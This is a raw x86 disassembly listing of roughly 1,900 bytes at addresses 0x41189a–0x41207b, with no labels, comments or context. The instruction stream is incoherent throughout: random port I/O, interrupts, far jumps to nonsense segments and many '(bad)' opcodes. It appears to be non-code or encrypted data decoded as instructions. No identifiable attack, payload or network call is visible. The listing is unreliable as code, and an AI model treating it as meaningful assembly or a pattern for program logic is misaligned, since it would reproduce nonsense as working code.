  41189a:	stos   BYTE PTR es:[edi],al
  41189b:	in     al,0x6d
  41189d:	dec    esp
  41189e:	pusha  
  41189f:	pop    ss
  4118a0:	les    ebx,FWORD PTR [ecx-0x44d6a46d]
  4118a6:	nop
  4118a7:	shr    BYTE PTR [edi+eiz*8-0x4b581a89],0xf
  4118af:	pop    ss
  4118b0:	jbe    0x4118b8
  4118b2:	test   BYTE PTR [ebx-0x48],bl
  4118b5:	sbb    BYTE PTR [ebx-0x5d],0x64
  4118b9:	xchg   ebp,eax
  4118ba:	xor    eax,0xc9f47b40
  4118bf:	cdq    
  4118c0:	popf   
  4118c1:	and    ch,BYTE PTR [ebx+eiz*4+0x78]
  4118c5:	sub    ebp,DWORD PTR ds:0xd1831244
  4118cb:	cmc    
  4118cc:	adc    edx,DWORD PTR [edx-0x70]
  4118cf:	bound  esp,QWORD PTR [edx-0x2df865d2]
  4118d5:	jbe    0x411859
  4118d7:	xor    cl,BYTE PTR [edi+0x32f67cc2]
  4118dd:	jle    0x411959
  4118df:	test   BYTE PTR [edx+0x64046c01],0x8d
  4118e6:	sahf   
  4118e7:	sub    DWORD PTR [eax],edx
  4118e9:	ja     0x41192c
  4118eb:	gs hlt 
  4118ed:	xor    ah,dl
  4118ef:	xor    ebp,DWORD PTR [esi+0x3a711523]
  4118f5:	enter  0xfd3c,0x2f
  4118f9:	sti    
  4118fa:	jbe    0x411976
  4118fc:	in     al,dx
  4118fd:	mov    ecx,0xd587fed6
  411902:	ja     0x4118d3
  411904:	int    0x5
  411906:	popf   
  411907:	add    DWORD PTR [ebp+0x52],esi
  41190a:	test   al,0xbe
  41190c:	xchg   ebp,eax
  41190d:	fst    QWORD PTR [esi]
  41190f:	addr16 int 0x7c
  411912:	push   cs
  411913:	xchg   edi,ecx
  411915:	and    al,0xd
  411917:	dec    ecx
  411918:	adc    ecx,ebp
  41191a:	mov    eax,ds:0x6ae7777b
  41191f:	leave  
  411920:	test   BYTE PTR [ebp+0x5c],0x95
  411924:	out    0x43,eax
  411926:	add    bh,BYTE PTR [ecx+0x7a]
  411929:	fsubp  st(5),st
  41192b:	and    al,0xcd
  41192d:	mov    esp,0x9cc5acab
  411932:	mov    ebp,0xfefa9ff
  411937:	shl    esp,cl
  411939:	inc    esp
  41193a:	test   al,0x90
  41193c:	scas   al,BYTE PTR es:[edi]
  41193d:	(bad)  
  41193e:	cmc    
  41193f:	nop    DWORD PTR [eax-0x2d574bdc]
  411946:	sub    al,0xe5
  411948:	sub    DWORD PTR [edi+ecx*4],0x3e509486
  41194f:	loope  0x411974
  411951:	fst    QWORD PTR [ebp+0x2486f155]
  411957:	clc    
  411958:	fcomi  st,st(3)
  41195a:	cmp    ebx,esi
  41195c:	fdivr  DWORD PTR [ecx]
  41195e:	cmc    
  41195f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411960:	mov    dh,0xe8
  411962:	addr16 pop esi
  411964:	add    al,0xc0
  411966:	jns    0x411921
  411968:	push   edx
  411969:	retf   
  41196a:	aas    
  41196b:	xchg   edi,eax
  41196c:	mov    edi,0x71a71958
  411971:	or     al,0xa8
  411973:	scas   eax,DWORD PTR es:[edi]
  411974:	sbb    DWORD PTR [ebp-0x56],esi
  411977:	jp     0x4119ec
  411979:	or     bh,BYTE PTR [esi]
  41197b:	test   eax,0x9e9ca233
  411980:	shr    BYTE PTR [ebp+0x3e4e82ea],cl
  411986:	mov    DWORD PTR [esi-0xd],ebp
  411989:	jp     0x41192e
  41198b:	fldenv [ecx+0x1d]
  41198e:	push   edx
  41198f:	or     al,0xc2
  411991:	mov    al,0x48
  411993:	out    dx,eax
  411994:	sub    al,0xd4
  411996:	mov    ds:0x9a654439,al
  41199b:	mov    DWORD PTR [ebx],ecx
  41199d:	ror    esi,0xea
  4119a0:	jecxz  0x4119f3
  4119a2:	jecxz  0x411a1e
  4119a4:	mov    esi,DWORD PTR [edi]
  4119a6:	and    eax,0x188716b7
  4119ab:	loopne 0x411949
  4119ad:	cld    
  4119ae:	adc    BYTE PTR [esi+0x8],cl
  4119b1:	jae    0x4119b7
  4119b3:	aas    
  4119b4:	dec    eax
  4119b5:	nop
  4119b6:	mov    ecx,0xf5e1675b
  4119bb:	dec    ecx
  4119bc:	sahf   
  4119bd:	adc    ecx,esi
  4119bf:	rcr    BYTE PTR [esi-0x5b],1
  4119c2:	mov    esi,0xf66409f1
  4119c7:	pop    es
  4119c8:	xor    dl,BYTE PTR [esi]
  4119ca:	je     0x411979
  4119cc:	pop    ebp
  4119cd:	gs test dl,al
  4119d0:	mov    ds:0x3f1bfbdb,eax
  4119d5:	lahf   
  4119d6:	jmp    0x85cc:0xdecf398a
  4119dd:	pop    esp
  4119de:	push   cs
  4119df:	aam    0x90
  4119e1:	icebp  
  4119e2:	inc    edi
  4119e3:	mov    esi,0x908c2620
  4119e8:	sbb    al,0x70
  4119ea:	iret   
  4119eb:	or     al,0x1e
  4119ed:	mov    ds:0x93091c72,al
  4119f2:	inc    ecx
  4119f3:	gs dec esi
  4119f5:	pop    ss
  4119f6:	dec    ebp
  4119f7:	inc    edi
  4119f8:	xchg   edx,esi
  4119fa:	jmp    0x4119fc
  4119fc:	mov    edx,0x9109f488
  411a01:	adc    eax,0x5fd721bb
  411a06:	repnz sub al,0xa6
  411a09:	push   0x72
  411a0b:	sti    
  411a0c:	pop    ds
  411a0d:	(bad)  
  411a0e:	sbb    DWORD PTR [esi+0x1a1b023e],esi
  411a14:	clc    
  411a15:	cli    
  411a16:	jecxz  0x4119e0
  411a18:	jmp    0x411a1a
  411a1a:	or     eax,0xe0ffa356
  411a1f:	sbb    ah,bh
  411a21:	clc    
  411a22:	mov    ds:0xf8586825,eax
  411a27:	repz out 0xf0,al
  411a2a:	adc    eax,DWORD PTR [edx]
  411a2c:	sti    
  411a2d:	mov    ebx,0x2722b6ff
  411a32:	mov    eax,ecx
  411a34:	sub    eax,0xcea09b1d
  411a39:	scas   al,BYTE PTR es:[edi]
  411a3a:	outs   dx,BYTE PTR ds:[esi]
  411a3b:	fcomp  QWORD PTR [edx]
  411a3d:	(bad)  
  411a3e:	sbb    dl,dh
  411a40:	aam    0xbe
  411a42:	xor    esp,DWORD PTR [ebx]
  411a44:	(bad)  
  411a45:	dec    esp
  411a46:	sbb    esp,DWORD PTR [edx-0x1c]
  411a49:	jl     0x4119f1
  411a4b:	int    0xb
  411a4d:	xchg   ecx,eax
  411a4e:	adc    eax,0x6a0ffefd
  411a53:	jae    0x411a53
  411a55:	push   ebp
  411a56:	add    BYTE PTR [ebx+esi*1+0x3421891f],dl
  411a5d:	mov    ds:0xbc04cf6b,al
  411a62:	xor    al,0xe1
  411a64:	dec    esp
  411a65:	retf   
  411a66:	rep ins DWORD PTR es:[edi],dx
  411a68:	jge    0x411a68
  411a6a:	xor    ah,BYTE PTR [ebp+0x29]
  411a6d:	add    BYTE PTR [ebx-0x1d],ch
  411a70:	fucom  st(6)
  411a72:	mov    cl,0x9f
  411a74:	ins    DWORD PTR es:[edi],dx
  411a75:	jmp    FWORD PTR [edi]
  411a77:	ror    BYTE PTR [esi],cl
  411a79:	out    0x5e,eax
  411a7b:	hlt    
  411a7c:	push   cs
  411a7d:	push   esp
  411a7e:	mov    al,0xc6
  411a80:	rcr    DWORD PTR [ebx],cl
  411a82:	inc    esp
  411a83:	lahf   
  411a84:	(bad)  
  411a85:	mov    bh,0xf7
  411a87:	mov    ebx,DWORD PTR [eax+ebx*2]
  411a8a:	dec    BYTE PTR [edx+ebp*4+0x6542c2ea]
  411a91:	das    
  411a92:	inc    esi
  411a93:	pop    ebx
  411a94:	sbb    eax,0x546604a2
  411a99:	or     eax,0x832be531
  411a9e:	xor    ch,BYTE PTR [eax-0x6b]
  411aa1:	push   esp
  411aa2:	(bad)  
  411aa3:	jns    0x411af9
  411aa5:	test   DWORD PTR [ebp-0x8ac0329],0xdef8f0a5
  411aaf:	iret   
  411ab0:	cs xor dl,dl
  411ab3:	outs   dx,BYTE PTR ds:[esi]
  411ab4:	xor    eax,0x5fd7e9e8
  411ab9:	pusha  
  411aba:	hlt    
  411abb:	cmp    ebp,ebp
  411abd:	data16 loope 0x411a9b
  411ac0:	sbb    eax,0x1e89e499
  411ac5:	dec    ecx
  411ac6:	mov    edi,0xb222e742
  411acb:	or     eax,0xdedaa9d0
  411ad0:	sub    dh,dl
  411ad2:	loopne 0x411b23
  411ad4:	(bad)  
  411ad5:	(bad)
  411ad9:	push   edi
  411ada:	outs   dx,DWORD PTR ds:[esi]
  411adb:	cmp    eax,0x3321c650
  411ae0:	xor    al,0x34
  411ae2:	imul   ebp,DWORD PTR [ecx-0xc778a04],0x53
  411ae9:	sbb    al,0x9c
  411aeb:	lea    ebp,[ebp+0x1c]
  411aee:	sub    dx,WORD PTR [edx+ecx*1]
  411af2:	jo     0x411ab8
  411af4:	lds    esp,FWORD PTR [edx-0x62]
  411af7:	test   bl,cl
  411af9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411afa:	xor    esp,edx
  411afc:	inc    edx
  411afd:	std    
  411afe:	out    0xb4,al
  411b00:	jmp    0x411a9a
  411b02:	mov    esp,0x40caba83
  411b07:	out    0xa4,al
  411b09:	xchg   edx,ebx
  411b0b:	sbb    ch,BYTE PTR [ebx+0x6e]
  411b0e:	sbb    dl,bh
  411b10:	add    BYTE PTR [edx-0x64f192c5],ah
  411b16:	push   ss
  411b17:	dec    ecx
  411b18:	sbb    al,0xc7
  411b1a:	(bad)  
  411b1b:	rol    BYTE PTR [edx+0x9c84f1f],cl
  411b21:	push   ebp
  411b22:	std    
  411b23:	setno  BYTE PTR [edi+0x55]
  411b27:	cmp    DWORD PTR [ebx+eiz*1],edi
  411b2a:	sub    edi,DWORD PTR [edi]
  411b2c:	cs and bh,bl
  411b2f:	xchg   esp,eax
  411b30:	gs pushf 
  411b32:	test   BYTE PTR [edx],cl
  411b34:	sar    DWORD PTR [eax-0x28],1
  411b37:	rcr    BYTE PTR [ebp-0x4c34db20],cl
  411b3d:	loope  0x411b5f
  411b3f:	and    al,0x45
  411b41:	jmp    0x8f190cf8
  411b46:	lods   al,BYTE PTR ds:[esi]
  411b47:	test   esp,0x6f033da6
  411b4d:	and    ebx,DWORD PTR [ebx-0x2a]
  411b50:	push   ds
  411b51:	iret   
  411b52:	shl    BYTE PTR [ebx+0x1acdc0f6],0x23
  411b59:	mov    bh,0x2c
  411b5b:	mov    al,ds:0x6eabf8d2
  411b60:	test   al,0x7
  411b62:	or     eax,0xcca32d1e
  411b67:	cdq    
  411b68:	arpl   bx,si
  411b6a:	inc    DWORD PTR [ebx-0x2fb92743]
  411b70:	xchg   ecx,eax
  411b71:	xchg   ecx,eax
  411b72:	lods   eax,DWORD PTR ds:[esi]
  411b73:	sar    DWORD PTR [esi-0x5f],1
  411b76:	push   edi
  411b77:	push   ebp
  411b78:	inc    esp
  411b79:	loope  0x411b64
  411b7b:	aam    0xe2
  411b7d:	jge    0x411bb7
  411b7f:	jne    0x411bc4
  411b81:	dec    esp
  411b82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411b83:	nop
  411b84:	push   ebp
  411b85:	icebp  
  411b86:	je     0x411bf8
  411b88:	outs   dx,DWORD PTR ds:[esi]
  411b89:	lahf   
  411b8a:	lods   al,BYTE PTR gs:[esi]
  411b8c:	int    0x40
  411b8e:	(bad)  
  411b8f:	or     bl,BYTE PTR [ecx-0x70b280b0]
  411b95:	xchg   esp,eax
  411b96:	js     0x411b2d
  411b98:	and    DWORD PTR [edx-0x6985ae7a],ebp
  411b9e:	imul   edi,DWORD PTR [edi-0x391273c0],0xa4c1ff61
  411ba8:	call   0x39f0f479
  411bad:	aam    0x14
  411baf:	(bad)  
  411bb0:	cld    
  411bb1:	jmp    0x411bce
  411bb3:	inc    DWORD PTR [ecx-0x3c]
  411bb6:	test   dh,bh
  411bb8:	repnz inc edx
  411bba:	mov    esp,0x2e6dbf1e
  411bbf:	int    0xf4
  411bc1:	fwait
  411bc2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411bc3:	or     DWORD PTR [esi],0x7451f62d
  411bc9:	test   DWORD PTR [eax+edi*1],ecx
  411bcc:	es stos DWORD PTR es:[edi],eax
  411bce:	ds aad 0x34
  411bd1:	add    BYTE PTR [eax+0x45914bfc],cl
  411bd7:	std    
  411bd8:	dec    dl
  411bda:	retf   0x24a0
  411bdd:	punpckhwd mm1,QWORD PTR [eax+esi*8+0x6a]
  411be2:	lock in al,0x9a
  411be5:	jmp    0x9ce831df
  411bea:	sbb    eax,0x2667edb0
  411bef:	dec    eax
  411bf0:	mov    al,0xe6
  411bf2:	pop    esp
  411bf3:	jle    0x411b84
  411bf5:	in     al,0x96
  411bf7:	jne    0x411bd5
  411bf9:	push   cs
  411bfa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411bfb:	pop    esi
  411bfc:	fucomi st,st(3)
  411bfe:	aad    0x64
  411c00:	outs   dx,BYTE PTR ds:[esi]
  411c01:	adc    DWORD PTR [ebp+0xf],edi
  411c04:	add    esi,esi
  411c06:	lock mov eax,0x884bdd01
  411c0c:	aam    0x9f
  411c0e:	loop   0x411c52
  411c10:	shl    DWORD PTR [ecx+0x159cd1d1],1
  411c16:	xchg   esi,eax
  411c17:	scas   eax,DWORD PTR es:[edi]
  411c18:	xchg   DWORD PTR [ecx+0xb743e49],ebx
  411c1e:	aas    
  411c1f:	(bad)  
  411c20:	(bad)  [esp+eiz*4]
  411c23:	adc    eax,edi
  411c25:	stc    
  411c26:	scas   al,BYTE PTR es:[edi]
  411c27:	jp     0x411ca0
  411c29:	ret    0x17cf
  411c2c:	repnz sbb eax,0x30982753
  411c32:	ja     0x411be8
  411c34:	sar    BYTE PTR [esi-0x41],0x5e
  411c38:	nop
  411c39:	mov    ds:0x81737b3c,eax
  411c3e:	daa    
  411c3f:	int    0xa6
  411c41:	add    DWORD PTR [eax+0x19ee7d51],eax
  411c47:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411c49:	xchg   edx,eax
  411c4a:	push   eax
  411c4b:	test   DWORD PTR ds:0x8a14731c,0xdce5119b
  411c55:	pop    ecx
  411c56:	pop    eax
  411c57:	adc    al,0x93
  411c59:	mov    edx,0xb302a798
  411c5e:	inc    esp
  411c5f:	ins    BYTE PTR es:[edi],dx
  411c60:	adc    al,0x22
  411c62:	cmc    
  411c63:	scas   eax,DWORD PTR es:[edi]
  411c64:	out    0xa9,eax
  411c66:	jns    0x411ca7
  411c68:	add    edi,DWORD PTR [ebp+0x5b669a15]
  411c6e:	sti    
  411c6f:	rol    BYTE PTR [edi+0x7d],cl
  411c72:	daa    
  411c73:	call   0x1f0f2e46
  411c78:	xor    BYTE PTR [ecx-0x54598837],dl
  411c7e:	jmp    0x7a8e37a1
  411c83:	push   esi
  411c84:	mov    esi,DWORD PTR [esi+0x73fa9839]
  411c8a:	out    0xc2,al
  411c8c:	lahf   
  411c8d:	or     esi,DWORD PTR [edx+ebp*1]
  411c90:	mov    esp,0x61957547
  411c95:	sub    DWORD PTR [eax+0x179c1b4b],edx
  411c9b:	je     0x411c43
  411c9d:	pop    ebp
  411c9e:	js     0x411c57
  411ca0:	pop    esi
  411ca1:	pop    ss
  411ca2:	in     al,dx
  411ca3:	and    al,0x2b
  411ca5:	mov    ch,0x93
  411ca7:	or     eax,0x834b497b
  411cac:	stc    
  411cad:	sub    al,0xc0
  411caf:	pushf  
  411cb0:	mov    bl,0xbc
  411cb2:	jmp    0x46fd3afd
  411cb7:	dec    esp
  411cb8:	mov    ds:0xfcaa3337,eax
  411cbd:	sahf   
  411cbe:	mov    DWORD PTR [ecx+0x50996e9f],edx
  411cc4:	xchg   BYTE PTR [ecx],ch
  411cc6:	mov    edi,0xa24377f3
  411ccb:	pop    edi
  411ccc:	sbb    al,0xf2
  411cce:	xor    BYTE PTR [edi-0x70329490],0x35
  411cd5:	fistp  QWORD PTR [ebp+0x30123125]
  411cdb:	sub    eax,0xc19c2329
  411ce0:	xchg   esp,eax
  411ce1:	adc    DWORD PTR [ebx],ebp
  411ce3:	out    dx,eax
  411ce4:	lods   eax,DWORD PTR ds:[esi]
  411ce5:	dec    ebx
  411ce6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411ce7:	pop    ss
  411ce8:	les    ebx,FWORD PTR [ebx]
  411cea:	pop    esi
  411ceb:	xor    al,0x21
  411ced:	test   eax,0x86f31c1a
  411cf2:	loop   0x411cf6
  411cf4:	xchg   ebp,eax
  411cf5:	or     BYTE PTR [ecx],0x25
  411cf8:	js     0x411cbd
  411cfa:	xchg   ebx,eax
  411cfb:	and    esi,0x94f7d6fd
  411d01:	cmp    edi,ebx
  411d03:	inc    sp
  411d05:	loope  0x411cba
  411d07:	gs xor al,0x13
  411d0a:	nop    DWORD PTR ds:0x6ffd83a5
  411d11:	jo     0x411d41
  411d13:	dec    ebp
  411d14:	test   eax,0x50ce4cf3
  411d19:	fstp   TBYTE PTR [esp+esi*2]
  411d1c:	push   es
  411d1d:	leave  
  411d1e:	pop    ebx
  411d1f:	ds xor al,0x61
  411d22:	imul   esp,DWORD PTR [edi+0xf2f7b12],0xffffffb0
  411d29:	xchg   esi,eax
  411d2a:	adc    bh,BYTE PTR [ebx-0x55aac5a6]
  411d30:	repnz ins DWORD PTR es:[edi],dx
  411d32:	push   ds
  411d33:	or     al,0xa3
  411d35:	ins    BYTE PTR es:[edi],dx
  411d36:	jg     0x411cc0
  411d38:	inc    edx
  411d39:	xchg   edi,eax
  411d3a:	aad    0x84
  411d3c:	scas   eax,DWORD PTR es:[edi]
  411d3d:	jb     0x411d69
  411d3f:	push   edx
  411d40:	lock cwde 
  411d42:	push   eax
  411d43:	sbb    ebx,0x739c53aa
  411d49:	int    0x16
  411d4b:	pop    edi
  411d4c:	jge    0x411d13
  411d4e:	mov    edi,ecx
  411d50:	cld    
  411d51:	adc    BYTE PTR [ebp+edi*2-0x1c],cl
  411d55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411d56:	std    
  411d57:	mov    dh,0x3d
  411d59:	repz adc BYTE PTR [ebp+0x23],al
  411d5d:	xchg   DWORD PTR [esi-0x2fa1038c],edi
  411d63:	inc    ebp
  411d64:	call   0x34b3:0x4f79f63e
  411d6b:	jg     0x411cf2
  411d6d:	xchg   cl,ah
  411d6f:	into   
  411d70:	shl    BYTE PTR [ebx-0x3937f3f2],0x4
  411d77:	(bad)  
  411d78:	pop    ds
  411d79:	fisttp WORD PTR [ebx+0x3291b977]
  411d7f:	adc    eax,DWORD PTR [edi-0x370ae615]
  411d85:	xor    cl,dh
  411d87:	out    dx,al
  411d88:	and    dh,BYTE PTR [eax+0x2b]
  411d8b:	mov    dl,0xaa
  411d8d:	ret    0xa7c6
  411d90:	inc    eax
  411d91:	inc    eax
  411d92:	stos   BYTE PTR es:[edi],al
  411d93:	call   0xeae7:0x19a74717
  411d9a:	idiv   DWORD PTR [esi+0xe]
  411d9d:	sar    BYTE PTR [esi+eax*4+0x10],cl
  411da1:	pop    es
  411da2:	call   0x80cc:0x242c977c
  411da9:	xor    esi,DWORD PTR [eax-0xc]
  411dac:	popf   
  411dad:	xchg   edi,eax
  411dae:	mov    ch,0x79
  411db0:	pushf  
  411db1:	push   eax
  411db2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411db3:	jecxz  0x411d8e
  411db5:	mov    ds:0xaa523668,eax
  411dba:	adc    dl,BYTE PTR [ebx+ebp*1-0x19]
  411dbe:	mov    edx,0x113641ad
  411dc3:	loop   0x411d65
  411dc5:	rcr    cl,1
  411dc7:	iret   
  411dc8:	repz mov ebp,0x19118444
  411dce:	jmp    0xf9a6:0x4294fc40
  411dd5:	add    BYTE PTR [ebp+ecx*4-0x35f5603d],dh
  411ddc:	aam    0x9f
  411dde:	add    DWORD PTR [eax-0x35ff3934],edi
  411de4:	inc    eax
  411de5:	das    
  411de6:	sub    ecx,ecx
  411de8:	jbe    0x411e4b
  411dea:	sub    edi,DWORD PTR [ecx+0x6f]
  411ded:	ret    
  411dee:	mov    eax,0xc27764a4
  411df3:	cwde   
  411df4:	aas    
  411df5:	cli    
  411df6:	pop    edx
  411df7:	shl    BYTE PTR [eax-0x46fb4e93],1
  411dfd:	shl    ecx,1
  411dff:	les    edx,FWORD PTR [ebp-0x57]
  411e02:	arpl   WORD PTR [esi+0x708b4e32],bp
  411e08:	das    
  411e09:	mov    ebp,0x4e5882bd
  411e0e:	xlat   BYTE PTR ds:[ebx]
  411e0f:	pop    ebp
  411e10:	inc    ebp
  411e11:	retf   0x6f97
  411e14:	mov    DWORD PTR [esp+eax*2-0x5848e519],esi
  411e1b:	add    DWORD PTR [edi+0x36],0xffffff8a
  411e1f:	out    0x1c,eax
  411e21:	sbb    BYTE PTR [edi],0x47
  411e24:	call   0x495b:0x87a77a35
  411e2b:	call   0x1c2ec647
  411e30:	pop    edx
  411e31:	add    eax,0x1ed85d38
  411e36:	loopne 0x411e0e
  411e38:	pcmpeqb mm6,mm0
  411e3b:	mov    eax,ds:0x41aca6f8
  411e40:	mov    eax,0x54e7a29
  411e45:	xor    al,0x3c
  411e47:	jg     0x411e87
  411e49:	cmp    eax,0x45577cb3
  411e4e:	test   al,0x21
  411e50:	push   es
  411e51:	fdivr  DWORD PTR [ebx]
  411e53:	mov    edi,0x870b6d9a
  411e58:	retf   
  411e59:	pop    ebp
  411e5a:	pop    edx
  411e5b:	(bad)  
  411e5e:	xor    DWORD PTR [ebx],ecx
  411e60:	sub    al,0x84
  411e62:	sbb    ebp,DWORD PTR [edi+0x33]
  411e65:	repz (bad) 
  411e67:	xor    eax,0x5f5030c3
  411e6c:	in     eax,0xc3
  411e6e:	cdq    
  411e6f:	sbb    al,0xe4
  411e71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411e72:	fistp  QWORD PTR ds:0x1bb078fd
  411e78:	imul   edi,ecx,0x40b9d37d
  411e7e:	in     al,dx
  411e7f:	ds sti 
  411e81:	leave  
  411e82:	lea    edx,ds:0xe6449283
  411e88:	mov    ah,0xb2
  411e8a:	sub    al,0x24
  411e8c:	sahf   
  411e8d:	mov    al,0x69
  411e8f:	retf   0xaf86
  411e92:	dec    BYTE PTR [eax+0xe]
  411e95:	ftst   
  411e97:	icebp  
  411e98:	fsub   QWORD PTR [edx]
  411e9a:	imul   ebp,DWORD PTR [eax],0xd05da84a
  411ea0:	xor    BYTE PTR [ecx-0x80],0x79
  411ea4:	cmp    DWORD PTR [si],ecx
  411ea7:	mov    ah,0x69
  411ea9:	adc    eax,0xbcb63fba
  411eae:	ror    DWORD PTR [edi+0x61],0xd
  411eb2:	sahf   
  411eb3:	fadd   QWORD PTR [eax+edx*4-0x38]
  411eb7:	add    esi,DWORD PTR [edi]
  411eb9:	inc    esp
  411eba:	loope  0x411e51
  411ebc:	fimul  DWORD PTR [ebp-0x3e]
  411ebf:	jecxz  0x411ea9
  411ec1:	xchg   esi,eax
  411ec2:	push   eax
  411ec3:	sahf   
  411ec4:	daa    
  411ec5:	jl     0x411efe
  411ec7:	mov    dh,0x1b
  411ec9:	and    ch,BYTE PTR [edi+eiz*8-0x7a]
  411ecd:	sub    eax,DWORD PTR [edi-0x50]
  411ed0:	jecxz  0x411eb4
  411ed2:	js     0x411ecc
  411ed4:	push   esi
  411ed5:	adc    edi,DWORD PTR [eax+edi*2+0x7]
  411ed9:	mov    eax,0xcc83b54a
  411ede:	mov    eax,0x2acc4772
  411ee3:	mov    bl,0xbe
  411ee5:	inc    ecx
  411ee6:	lock lds eax,FWORD PTR [edx-0x9b2ae26]
  411eed:	jo     0x411e70
  411eef:	mov    ebx,DWORD PTR ds:[edx+0x7388f79d]
  411ef6:	add    ebp,ecx
  411ef8:	xor    BYTE PTR [ebx+0x13],0xa6
  411efc:	div    DWORD PTR [ebx]
  411efe:	add    bl,ch
  411f00:	mov    cl,0x6d
  411f02:	mov    bl,BYTE PTR [eax]
  411f04:	retf   0x2bfc
  411f07:	xchg   edi,eax
  411f08:	mov    edi,0xf6049d3e
  411f0d:	mov    ecx,esp
  411f0f:	push   ds
  411f10:	retf   0xdec9
  411f13:	imul   eax,DWORD PTR [ecx-0x5a1d099],0xbfd70781
  411f1d:	jmp    0x89ae:0xeca0ce79
  411f24:	xchg   ebx,eax
  411f25:	add    BYTE PTR [ebx-0x3f08bb6f],cl
  411f2b:	popa   
  411f2c:	push   ebp
  411f2d:	push   0x2e87ef84
  411f32:	stos   DWORD PTR es:[edi],eax
  411f33:	loop   0x411f91
  411f35:	inc    ecx
  411f36:	outs   dx,BYTE PTR ds:[esi]
  411f37:	scas   eax,DWORD PTR es:[edi]
  411f38:	mul    DWORD PTR [ebx+0x0]
  411f3b:	sbb    bl,BYTE PTR [ebx]
  411f3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411f3e:	push   ebp
  411f3f:	loop   0x411f36
  411f41:	push   es
  411f42:	fadd   QWORD PTR [esi+edx*4-0x1630976c]
  411f49:	or     esi,DWORD PTR [ebp+0x17]
  411f4c:	xor    DWORD PTR [ecx],edx
  411f4e:	dec    edi
  411f4f:	mov    edi,0xcc8edc1f
  411f54:	arpl   WORD PTR [edx+0x3],dx
  411f57:	pop    es
  411f58:	in     eax,dx
  411f59:	cdq    
  411f5a:	sub    DWORD PTR [edx+esi*2-0x5bcdd7a3],eax
  411f61:	inc    eax
  411f62:	mov    ebp,0x75cc6c45
  411f67:	minps  xmm4,XMMWORD PTR [esi]
  411f6a:	out    0x4e,al
  411f6c:	cmp    BYTE PTR [ebx+0x36a0debe],ch
  411f72:	fmulp  st(5),st
  411f74:	xor    ebx,ecx
  411f76:	test   DWORD PTR fs:[esi],ecx
  411f79:	jne    0x411f16
  411f7b:	sub    al,0x7d
  411f7d:	scas   al,BYTE PTR es:[edi]
  411f7e:	mov    ch,0xe5
  411f80:	or     edx,edi
  411f82:	dec    esi
  411f83:	fcmove st,st(0)
  411f85:	popa   
  411f86:	inc    edx
  411f87:	adc    esi,DWORD PTR [esi+edx*4+0x4f123f77]
  411f8e:	out    0x4a,al
  411f90:	fistp  DWORD PTR [edx-0x3a152bc2]
  411f96:	jg     0x411f4c
  411f98:	push   eax
  411f99:	aaa    
  411f9a:	cmp    bh,ch
  411f9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411f9d:	jnp    0x411f5d
  411f9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411fa0:	xor    dl,BYTE PTR ds:[edi-0x4f50761a]
  411fa7:	push   ecx
  411fa8:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411faa:	xchg   edx,eax
  411fab:	mov    edi,0xc4acb08b
  411fb0:	mov    bl,dl
  411fb2:	push   eax
  411fb3:	mov    DWORD PTR [esi+0x1d977715],eax
  411fb9:	fisttp WORD PTR [edi-0x2c644bd8]
  411fbf:	mov    DWORD PTR [eax+0x60],edx
  411fc2:	mov    DWORD PTR [eax+0x68a4e9fa],ebp
  411fc8:	or     edx,DWORD PTR [eax-0x1d]
  411fcb:	sub    DWORD PTR [edi-0x6fe530c9],0x7d
  411fd2:	ret    
  411fd3:	ss push esi
  411fd5:	dec    edi
  411fd6:	neg    DWORD PTR [ebx-0x6ef14c94]
  411fdc:	xchg   edi,eax
  411fdd:	or     al,0xc7
  411fdf:	mov    esp,0xce7a57ba
  411fe4:	lds    esp,FWORD PTR [ebx]
  411fe6:	test   eax,0x416cf5c3
  411feb:	ins    DWORD PTR es:[edi],dx
  411fec:	pop    edi
  411fed:	mov    esi,0x3589ef77
  411ff2:	adc    BYTE PTR [eax],al
  411ff4:	sub    al,0x97
  411ff6:	jecxz  0x411fb8
  411ff8:	ins    DWORD PTR es:[edi],dx
  411ff9:	and    eax,0x88329a26
  411ffe:	lods   eax,DWORD PTR ds:[esi]
  411fff:	and    edi,ecx
  412001:	mov    ecx,0x95308db6
  412006:	add    al,0x1e
  412008:	pop    es
  412009:	jmp    0x41206d
  41200b:	jo     0x412073
  41200d:	mov    ebp,0x96bdf8aa
  412012:	fidiv  WORD PTR [ecx+esi*1-0x73]
  412016:	ja     0x412019
  412018:	inc    edi
  412019:	fiadd  DWORD PTR [edx]
  41201b:	test   eax,0x7cc7a250
  412020:	or     ecx,eax
  412022:	mov    dh,BYTE PTR [esi+ecx*2]
  412025:	sbb    DWORD PTR [ebp+0x54],eax
  412028:	ror    BYTE PTR [ecx-0x1600196],1
  41202e:	test   DWORD PTR [ebx+0x514ed692],0xe12983ce
  412038:	sub    al,0xc7
  41203a:	inc    esi
  41203b:	inc    esp
  41203c:	mov    al,0xd5
  41203e:	outs   dx,BYTE PTR ds:[esi]
  41203f:	dec    ecx
  412040:	pop    ds
  412041:	add    ch,dh
  412043:	repz sbb DWORD PTR [esi],eax
  412046:	xchg   ecx,eax
  412047:	outs   dx,DWORD PTR ds:[esi]
  412048:	add    al,BYTE PTR [ebx-0x4f]
  41204b:	sbb    dh,BYTE PTR [esi]
  41204d:	mov    edi,0x1e34a820
  412052:	push   edx
  412053:	fnstcw WORD PTR [edx+0x5ad448c1]
  412059:	xor    bl,BYTE PTR [ebx]
  41205b:	and    ah,BYTE PTR [ecx-0x3f1d8607]
  412061:	push   ecx
  412062:	inc    esi
  412063:	loope  0x412035
  412065:	outs   dx,BYTE PTR ds:[esi]
  412066:	imul   eax,DWORD PTR [ebx+edi*8],0x38
  41206a:	xchg   ecx,eax
  41206b:	or     eax,0x418a039c
  412070:	pop    esi
  412071:	mov    ds:0xb0296c15,al
  412076:	dec    eax
  412077:	jbe    0x412046
  412079:	mov    BYTE PTR [edx],dl
  41207b:	(bad)  
